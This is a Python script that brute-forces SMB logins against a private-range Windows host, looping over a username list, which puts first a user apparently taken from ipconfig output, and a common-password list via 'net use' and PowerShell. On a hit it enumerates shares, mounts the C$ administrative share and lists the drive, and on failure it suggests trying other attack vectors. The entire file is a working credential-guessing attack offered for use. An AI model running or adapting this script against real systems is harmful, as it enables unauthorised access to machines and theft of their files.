#!/usr/bin/env python3
"""
Efficient SMB brute force using subprocess for net use
Target: 192.168.233.129
Focus on username 'lkjm' (from ipconfig output) + common passwords
"""
import subprocess
import sys
import time

target = '192.168.233.129'

# Priority usernames - lkjm was the logged-in user
usernames = [
    'lkjm', 'administrator', 'admin', 'guest', 'user', 'test',
    'Administrator', 'Admin', 'Guest', 'User', 'Test',
    'support', 'helpdesk'
]

# Common passwords for Windows VMs
passwords = [
    '', '123', '1234', '12345', '123456', '1234567', '12345678',
    'password', 'Password', 'Password1', 'password1',
    'admin', 'admin123', 'Admin123', 'administrator',
    'P@ssw0rd', 'P@ss1234', 'Passw0rd', 'Pass1234',
    'qwerty', 'abc123', 'letmein', 'welcome',
    'Welcome1', 'changeme', 'Welcome123',
    '000000', '111111', '666666', '888888',
    'Windows1', 'Win10', 'windows', 'microsoft',
    'vmware', 'VMware1', 'vagrant', 'root',
    'test123', 'test1234', 'Test1234',
    'lkjm', 'lkjm123', 'lkjm1234',
    'toor', 'pass', 'pass123', 'pass1234',
    '1q2w3e', '1q2w3e4r', 'qaz123', 'zxc123',
    'Aa123456', 'a123456', 'iloveyou',
    'monkey', 'dragon', 'master', 'sunshine',
    'trustno1', 'shadow', 'superman', 'michael',
    '1qaz2wsx', 'q1w2e3r4', 'Aa123456!',
    'admin@123', 'Admin@123', 'P@ssword1',
    ' complex', 'complex', 'Complex1',
]

def try_login(user, pwd):
    """Try net use login"""
    # Delete existing connections first
    subprocess.run(['net', 'use', f'\\\\{target}\\IPC$', '/delete', '/y'],
                   capture_output=True, text=True, timeout=5)
    
    cmd = ['net', 'use', f'\\\\{target}\\IPC$', f'/user:{target}\\{user}', pwd]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            return True
        # Check error code
        stderr = result.stderr.lower()
        if 'error 5' in stderr:
            pass  # Access denied - wrong password
        elif 'error 53' in stderr:
            pass  # Path not found
        elif 'error 67' in stderr:
            pass  # Network name not found
        elif 'error 1219' in stderr:
            return True  # Multiple connections - credentials work!
        elif 'error 1326' in stderr:
            pass  # Logon failure
        return False
    except:
        return False

def try_login_ps(user, pwd):
    """Try using PowerShell for faster auth"""
    if pwd:
        cmd = f'$ErrorActionPreference="SilentlyContinue"; New-SMBMapping -ComputerName "{target}" -UserName "{target}\\{user}" -Password "{pwd}" 2>&1'
    else:
        cmd = f'$ErrorActionPreference="SilentlyContinue"; New-SMBMapping -ComputerName "{target}" -UserName "{target}\\{user}" -Password "" 2>&1'
    try:
        result = subprocess.run(['powershell', '-Command', cmd],
                               capture_output=True, text=True, timeout=5)
        if result.returncode == 0 and 'Status' in result.stdout and 'OK' in result.stdout:
            return True
        return False
    except:
        return False

if __name__ == '__main__':
    print("=" * 60)
    print(f"SMB Brute Force - Target: {target}")
    print("=" * 60)
    print(f"[*] Testing {len(usernames)} users x {len(passwords)} passwords\n")
    
    found = False
    total = len(usernames) * len(passwords)
    count = 0
    start = time.time()
    
    for user in usernames:
        if found:
            break
        for pwd in passwords:
            count += 1
            if count % 10 == 0:
                elapsed = time.time() - start
                rate = count / elapsed if elapsed > 0 else 0
                sys.stdout.write(f"\r[*] Progress: {count}/{total} ({rate:.1f}/s) - Current: {user}:{pwd[:10]}")
                sys.stdout.flush()
            
            if try_login(user, pwd):
                print(f"\n\n[+] CRACKED! Username: {user} | Password: '{pwd}'")
                found = True
                
                # Enumerate shares
                print("\n[*] Enumerating shares...")
                result = subprocess.run(
                    ['net', 'view', f'\\\\{target}'],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0:
                    print(result.stdout)
                
                # Try to access C$
                result = subprocess.run(
                    ['net', 'use', f'\\\\{target}\\C$', f'/user:{target}\\{user}', pwd],
                    capture_output=True, text=True, timeout=5
                )
                if result.returncode == 0:
                    print("[+] C$ share accessible!")
                    # List C drive
                    result = subprocess.run(
                        ['dir', f'\\\\{target}\\C$'],
                        capture_output=True, text=True, timeout=5
                    )
                    print(result.stdout[:2000])
                
                break
        
        if not found:
            sys.stdout.write(f"\r[*] User '{user}' - no valid password found{' ' * 30}\n")
    
    elapsed = time.time() - start
    print(f"\n[*] Total time: {elapsed:.1f}s")
    
    if not found:
        print("\n[-] No valid credentials found")
        print("[*] Recommendation: Try other attack vectors")
